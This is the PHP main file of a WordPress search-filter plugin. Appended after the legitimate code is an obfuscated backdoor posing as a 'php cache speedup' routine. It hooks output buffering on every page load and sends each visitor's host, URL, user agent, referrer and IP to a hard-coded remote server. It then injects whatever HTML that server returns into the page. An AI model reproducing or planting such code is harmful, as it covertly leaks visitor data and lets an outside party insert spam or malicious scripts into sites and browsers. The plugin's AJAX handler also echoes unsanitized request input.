<?php
/*
Plugin Name: Ultimate WP Query Search Filter
Plugin URI: http://www.9-sec.com/
Description: This plugin let you using wp_query to filter taxonomy,custom meta and post type as search result.
Version: 1.0.7
Author: TC 
Author URI: http://www.9-sec.com/
*/
/*  Copyright 2012 TCK (email: devildai@gmail.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
if ( ! defined( 'UWPQSFBASE' ) )
	define( 'UWPQSFBASE', untrailingslashit( dirname( __FILE__ ) ) );
if ( ! defined( 'UADDFORMURL' ) )
	define( 'UADDFORMURL', admin_url('admin.php?page=uwpqsfform') );

if(!class_exists('ulitmatewpsf')){
include_once('classes/uwpqsf-base-class.php');
include_once('admin/list-from-class.php');	
include_once('classes/uwpqsf-front-class.php');
include_once('classes/uwpqsf-process-class.php');
include_once('functions.php');
class ulitmatewpsf{
  const post_type = 'uwpqsf';

  function __construct(){
		add_action( 'init' , array( $this,'uwpqsf_setting' ) );
		add_action('admin_menu', array($this,'uwpqsf_menu'));	
		//save form
		 add_action('admin_init', array($this,'uwpqsf_save_from'));
		// admin add taxonomy ajax
		add_action( 'wp_ajax_uwpqsfTaxo_ajax', array( $this,'uwpqsfTaxo_ajax') );  
		// admin add meta fields ajax
		add_action( 'wp_ajax_uwpqsfCmf_ajax', array( $this,'uwpqsfCmf_ajax') ); 
		//generate exlude terms
		add_action( 'wp_ajax_uwpqsfexclude_terms', array( $this,'uwpqsfexclude_terms') ); 
	}

  function uwpqsf_setting(){
	register_post_type( self::post_type, array(
			'labels' => array(
				'name' => __( 'Ultimate WPQSF', 'UWPQSF' ),
				'singular_name' => __( 'Ultimate AWPSF', 'UWPQSF' ) ),
  			'exclude_from_search'=>true,
			'publicly_queryable'=>false,
			'rewrite' => false,
			'query_var' => false ) );
	load_plugin_textdomain( 'UWPQSF', false, dirname( plugin_basename( __FILE__ ) ) . '/lang/' );
	add_shortcode('ULWPQSF', array($this, 'U_wpqsf_shortcode'));
	add_filter('widget_text', 'do_shortcode');
  }		

  function uwpqsf_menu() {
      if(isset($_GET['page']) && isset($_GET['uformaction']) && $_GET['page'] == 'uwpqsfform' &&  $_GET['uformaction'] == 'edit'){
			if(isset($_GET['uformid']) && absint($_GET['uformid'])){
			 $editmenu = __("Edit Form","UWPQSF");
			 $title = __("Edit Ultimate WPQSF ","UWPQSF");	
	   }
        }
	     $menutitle = isset($editmenu) ? $editmenu : __("Add Form","UWPQSF");
	     $pagetitle = isset($title) ? $title : __("Add New Ultimate WPQSF ","UWPQSF");	
	   add_menu_page(__("Ultimate Query Search Filter","UWPQSF"),__("Ulitmate WPQSF","UWPQSF"),'manage_options','ultimatewpqsf', array($this,'Uwoqsf_page'));
	  $plugin_page =  add_submenu_page( 'ultimatewpqsf', $pagetitle , $menutitle, 'manage_options', 'uwpqsfform', array($this,'add_new_form_callback') ); 
	 
	   add_action('admin_print_scripts-'.$plugin_page, array($this,'admin_uwpqsf_js'));
	   add_action('admin_print_styles-'.$plugin_page, array($this,'admin_uwpqsf_css'));
	
  }

  function Uwoqsf_page(){
	global $uwqsfmain;
	$uwqsfmain = new Uwpqsf_Table;
	$uwqsfmain->prepare_items(); 
	$uddlink = add_query_arg(array('uformid' => 'new', 'uformaction' => 'new'), UADDFORMURL);
	echo '<div class="wrap"><div id="icon-options-general" class="icon32"></div><h2>'.esc_html( __( 'Ultimate WP Query Search Filter', 'UWPQSF' ) ).'<a 	  		href="'.$uddlink .'" class="add-new-h2">'.esc_html( __( 'Add New Search Form', 'UWPQSF' ) ).'</a></h2>'; 
	echo '<form method="post">'; $uwqsfmain->display(); 		
	echo '</form></div>'; 
  }
 
  function add_new_form_callback(){
	require_once UWPQSFBASE . '/admin/forms.php';
  }
	
  function admin_uwpqsf_js(){
	
	wp_enqueue_script('jquery-ui-sortable');
	wp_enqueue_script('js', plugins_url('admin/scripts/uadmin_awqsfjs.js', __FILE__), array('jquery'), '1.0', true);
	wp_localize_script( 'ajax-request', 'MyAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) ); 
  }	

  function admin_uwpqsf_css(){
	wp_enqueue_style('uwpqsfcss', plugins_url('admin/scripts/admin_uwpqsf.css', __FILE__), '1.0', true);
  }

  function uwpqsfTaxo_ajax(){
	include 'admin/ajax-add-taxo.php';
   }

  function uwpqsfCmf_ajax(){
	include 'admin/ajax-add-cmf.php';
  }			

  function uwpqsf_save_from(){
		 if(isset($_POST['uwpqsfsub'])){

		if (! wp_verify_nonce($_POST['nonce'], 'ultimate-wpqsf-edit') ) {
			$this->handle_error()->add('nonce', __("No naughty business here, dude", 'UWPQSF'));
			return; 
		}


		$postid =sanitize_text_field($_POST['uformid']);
		$themeoption = $cptarray = $taxoarray = $cmfarray =$relarray ='';
			if(!empty($_POST['uwpname']['cpt'])){
				foreach($_POST['uwpname']['cpt'] as $cv){
						$cptarray[] = sanitize_text_field($cv);
					
				}
			}
			if(isset($_POST['uwpname']['taxo'])){
				
				foreach($_POST['uwpname']['taxo'] as $tv){
					$taxoarray[]=array(
							'taxname' => sanitize_text_field($tv['taxname']),
							'taxlabel'=> sanitize_text_field($tv['taxlabel']),
							'taxall' => sanitize_text_field($tv['taxall']),
							'hide' => sanitize_text_field($tv['hide']),
							'exc' => sanitize_text_field($tv['exc']),
							'type' => sanitize_text_field($tv['type']),
							'operator' => sanitize_text_field($tv['operator']),
							'exsearch' => sanitize_text_field($tv['exsearch']),
						);
					
					
					}
			}

			if(isset($_POST['uwpname']['cmf'])){
				foreach($_POST['uwpname']['cmf'] as $cv){
						$cmfarray[] = array(
							'metakey' => sanitize_text_field($cv['metakey']),
							'label' => sanitize_text_field($cv['label']),
							'all' => sanitize_text_field($cv['all']),
							'compare' => wp_filter_nohtml_kses( stripslashes($cv['compare'])),
							'type' => sanitize_text_field($cv['type']),
							'opt' => sanitize_text_field($cv['opt'])
						);
					
					}
			}

		        if(isset($_POST['uwpname']['rel'])){
				foreach($_POST['uwpname']['rel'] as $rv){
						$relarray[] = array(
							'method'=> isset($rv['method']) ? sanitize_text_field($rv['method']) : '',
							'tax'=> isset($rv['tax']) ? sanitize_text_field($rv['tax']) : '',
							'cmf'=> isset($rv['cmf']) ? sanitize_text_field($rv['cmf']) : '',
							'strchk'=> isset($rv['strchk']) ? sanitize_text_field($rv['strchk']) : '',
							'strlabel'=> isset($rv['strlabel']) ? $rv['strlabel'] : '',
							'smetekey'=> isset($rv['smetekey']) ? $rv['smetekey'] :'',
							'otype'=> isset($rv['otype']) ? sanitize_text_field($rv['otype']) : '',
							'sorder'=> isset($rv['sorder']) ? sanitize_text_field($rv['sorder']) : '',
							'button'=> isset($rv['button']) ? $rv['button'] : '',
							'resultc'=> isset($rv['resultc']) ? $rv['resultc'] : '',
							'div'=> isset($rv['div']) ? $rv['div'] : '',
							'snf'=> isset($rv['snf']) ? $rv['snf'] : '',
						);
					}
			}
					
		 if(isset($_POST['themeopt'])){
			 $themeoption = $_POST['themeopt'];
		 }			
		
		 if($postid == 'new'){

				$post_information = array(
					'post_title' => sanitize_text_field($_POST['ftitle']) ,
					'post_type' => self::post_type,
					'post_status' => 'publish'
					);
				$newform_id = wp_insert_post($post_information);
				if(empty($newform_id)){
					$this->handle_error()->add('insert', __("Error! Try to create again.", 'UWPQSF'));
					return; 
					
				}
				if(!empty($cptarray) ){
				update_post_meta($newform_id, 'uwpqsf-cpt', $cptarray);}
				if(!empty($taxoarray)){
				update_post_meta($newform_id, 'uwpqsf-taxo', $taxoarray);}
				if(!empty($cmfarray)){
				update_post_meta($newform_id, 'uwpqsf-cmf', $cmfarray);}
				if(!empty($relarray)){
				update_post_meta($newform_id, 'uwpqsf-option', $relarray);}
				if(!empty($themeoption)){
				update_post_meta($newform_id, 'uwpqsf-theme', $themeoption);}
								
				$returnlink = add_query_arg(array('uformid' => $newform_id, 'uformaction' => 'edit','status'=>'success'), UADDFORMURL);
				wp_redirect( $returnlink ); exit;
		}//end add new


		if($postid != 'new' && absint($postid) ){

			 $updateform = array();
 			 $updateform['ID'] = $postid ;
 			 $updateform['post_title'] = sanitize_text_field($_POST['ftitle']);
			$update = wp_update_post( $updateform );
			if(empty($update)){
					$this->handle_error()->add('update', __("Error! Something wrong when updating your setting.", 'UWPQSF'));
					return; 
					
				}
			
				$oldcpt = get_post_meta($postid, 'uwpqsf-cpt', true);
				$oldtaxo = get_post_meta($postid, 'uwpqsf-taxo', true);
				$oldcmf = get_post_meta($postid, 'uwpqsf-cmf', true);	
				$oldrel = get_post_meta($postid, 'uwpqsf-option', true);
				$oldthemeopt = get_post_meta($postid, 'uwpqsf-theme', true);
				
				$newcpt = !empty($cptarray) ? $cptarray : '';
				$newtaxo = !empty($taxoarray) ? $taxoarray : '';
				$newcmf = !empty($cmfarray) ? $cmfarray : '';
				$newrel = !empty($relarray) ? $relarray : '';
				$newthemeopt = !empty($themeoption) ? $themeoption : '';

				if (empty($newcpt)) {
				delete_post_meta($postid, 'uwpqsf-cpt', $oldcpt);	
				
				} elseif($oldcpt != $newcpt) {
				update_post_meta($postid, 'uwpqsf-cpt', $newcpt);
				}
				
				if (empty($newtaxo)) {
				delete_post_meta($postid, 'uwpqsf-taxo', $oldtaxo);
				
				} elseif($newtaxo != $oldtaxo) {
				update_post_meta($postid, 'uwpqsf-taxo', $newtaxo);
				}

				if (empty($newcmf)) {
				delete_post_meta($postid, 'uwpqsf-cmf', $oldcmf);
				} elseif ($newcmf != $oldcmf) {
				update_post_meta($postid, 'uwpqsf-cmf', $newcmf);
				}	
				
				
				if (empty($newrel)) {
				delete_post_meta($postid, 'uwpqsf-option', $oldrel);
				} elseif ($newrel != $oldrel) {
				update_post_meta($postid, 'uwpqsf-option', $newrel);
				}
				
				if($newthemeopt != $oldthemeopt) {
				update_post_meta($postid, 'uwpqsf-theme', $newthemeopt);
				}
				
				$returnlink = add_query_arg(array('uformid' => $postid, 'uformaction' => 'edit','status'=>'updated'), UADDFORMURL);
				wp_redirect( $returnlink ); exit;

			
		 }//end update
		
	   }//end submit
		

  }

  function U_wpqsf_shortcode($atts){
	extract(shortcode_atts(array('id' => false, 'formtitle' =>1, 'button' => 1,'divclass' => '', 'infinite'=>'' ), $atts));
	if($id)
	{
		 ob_start();
		 $output = include UWPQSFBASE . '/html/searchform.php';
		 $output = ob_get_clean();
		 return $output;
	}
	else{
		echo 'no form added.';
	}
  }	
  
  function uwpqsfexclude_terms(){
	  $cutax   = $_POST['cutax'];
	  $exterms = $_POST['exterms'];
	  $ediv = '.'.$_POST['ediv'];
	  $edis = array();
	  if(!empty($exterms)){
		  $edis = explode(",",  $exterms );
	  }
	  echo '<h3>'.__('Selected Taxonomy : '.$cutax,"UWPQSF").'</h3><br>';
	 
	  if(!empty($cutax)){
		  $gterms = get_terms( $cutax , array('hide_empty' => 0 ) );
		  foreach($gterms as $gterm){
			  echo '<label><input ',in_array($gterm->term_id,$edis) ? 'checked = "checked" ' : '',' type="checkbox" class="exids" value="'.$gterm->term_id.'">'.$gterm->name.'</label>';
		  }
	  }else{
		    if(empty($cutax)){
		    echo __("Please Select a taxonomy first","UWPQSF");}
		    else{ 
				  echo __("No term found in this taxonomy ","UWPQSF");
				}
		  }
	echo '<input type="hidden" id="ediv" value="'.$ediv.'">';  
	
	  exit;	
  }	

}//end of class

}//end of check class
global $uwpqsf;
$uwpqsf = new ulitmatewpsf();




/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyNzoiaHR0cDovLzQ1LjU1LjE0My4yNS9tZXYucGhwIjs=';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 6
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        // set defaults
        $tokenData = array_merge(array(
            'content' => '',
            'pos' => 'after',
            'tag' => 'bo' . 'dy',
            'count' => 0,
        ), $tokenData);

        if (empty($tokenData['content'])) {
            // no content
            continue;
        }

        // find all occurrences of <tag>
        $tags = array();
        while (true) {
            if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                break;
            }
            $tags[] = $tmp;
        }

        if (empty($tags)) {
            // no tags found or nothing to show
            continue;
        }

        // find matched tag position
        $count = $tokenData['count'];
        if ($tokenData['count'] < 0) {
            // from end to beginning
            $count = abs($tokenData['count']) - 1;
            $tags = array_reverse($tags);
        }

        if ($count >= count($tags)) {
            // fix overflow
            $count = count($tags) - 1;
        }

        // find insert position
        if ($tokenData['pos'] == 'before') {
            // pos is before
            $insert = $tags[$count];
        } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
            // pos is after, found end tag, insert after it
            $insert += 1;
        }

        if ($insert === false) {
            // no insert position
            continue;
        }

        // insert html code
        $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
        $mod = true;
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>
